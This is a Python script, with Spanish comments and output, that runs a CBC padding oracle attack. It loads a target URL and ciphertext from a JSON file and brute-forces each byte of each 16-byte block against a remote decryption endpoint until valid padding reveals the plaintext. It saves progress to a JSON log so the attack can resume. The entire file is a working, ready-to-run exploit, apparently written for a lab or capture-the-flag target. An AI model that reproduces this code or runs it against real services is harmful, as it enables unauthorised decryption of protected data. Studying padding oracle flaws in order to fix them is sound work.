
import sys
import json
import binascii

import u.utils


def save_progress(pad_data):
    data_to_save = {
        'hash_data': pad_data['hash_data'],
        'working_block': pad_data['working_block'],
        'working_byte': pad_data['working_byte'],
        'blocks_decoded': pad_data['blocks_decoded'],
        'decoded_bytes': binascii.hexlify(pad_data['decoded_bytes']).decode('utf8'),
    }
    try:
        data_to_save['decoded_string'] = pad_data['decoded_bytes'].decode('utf8')
    except Exception:
        pass
    with open('padding_oracle.json', 'w') as log:
        log.write(json.dumps(data_to_save))



hash_file = 'hash.json'
try:
    hash_file = sys.argv[1]
except Exception as e:
    pass

with open(hash_file, 'r') as f:
    hash_data = json.loads(f.read())


url = hash_data['url']
hash_b = binascii.unhexlify(hash_data['hash'])
hash_ = memoryview(hash_b)

decoded_bytes = [0] * len(hash_)

blocks = int(len(hash_) / 16)
initial_block = 0

print(f"Trabajando con \n {hash_data}")
print(f"Longitud del hash : {len(hash_data['hash'])}")
print(f"Cantidad de bloques : {blocks}")
print(f"Bloque Inicial : {initial_block}")

padding_oracle_data = { 
    'hash_data': hash_data,
    'working_block': 0,
    'working_byte': 0,
    'blocks_decoded': [],
    'decoded_bytes': bytearray(len(hash_))
}

for block_index in range(initial_block, blocks, 1):
    padding_oracle_data['working_block'] = block_index
    i = block_index * 16
    f = i + 16
    block_data = hash_[i:f]
    decoded_bytes = memoryview(padding_oracle_data['decoded_bytes'])[i:f]
    working_buffer = memoryview(bytearray(hash_))
    sending_buffer = working_buffer[:f+16]
    working_block = working_buffer[i:f]

    print(f'Procesando bloque : {block_index}')
    print(f"Bloque    : {binascii.hexlify(block_data).decode('utf8')}")
    print(f"Working   : {binascii.hexlify(working_block).decode('utf8')}")
    print(f"To Send   : {binascii.hexlify(sending_buffer).decode('utf8')}")

    #para cada uno de los bytes del bloque
    for b in range(16):
        byte_found = False
        pos = 15 - b

        print(f'Procesando bloque {block_index} byte {pos}')
        padding_oracle_data['working_byte'] = pos
        save_progress(padding_oracle_data)

        #corrijo el padding para el bloque en proceso.        
        padding = 16 - pos
        for pad in range(pos,16):
            working_block[pad] = decoded_bytes[pad] ^ block_data[pad] ^ (padding + 1)
            print(f"Woking Block con padding : {binascii.hexlify(working_block)}")

        # pruebo todos los valores de bytes, ultimo el valor original
        bytes_to_try = [x for x in range(0,block_data[pos])] + [x for x in range(block_data[pos]+1,256)] + [block_data[pos]]
        tries = 0
        for c in bytes_to_try:
            if byte_found:
                break
            if c != block_data[pos]:
                working_block[pos] = c
                #print(binascii.hexlify(sending_buffer).decode('utf8'))
                try:
                    u.utils.decript_data(url, sending_buffer)
                    print(f"Encontrado {c} para {block_index} en la pos {pos}")
                    decoded_bytes[pos] = block_data[pos] ^ working_block[pos] ^ padding
                    byte_found = True
                    break

                except Exception as e:
                    tries += 1
                    sys.stdout.write('.')
                    sys.stdout.flush()
                    pass

        if not byte_found:
            raise Exception(f'No se pudo encontrar solución al bloque {block_index} byte {pos}')

        print(binascii.hexlify(decoded_bytes))
        try:
            print(decoded_bytes.decode('utf8'))
        except Exception:
            pass

    padding_oracle_data['blocks_decoded'].append(block_index)
    save_progress(padding_oracle_data)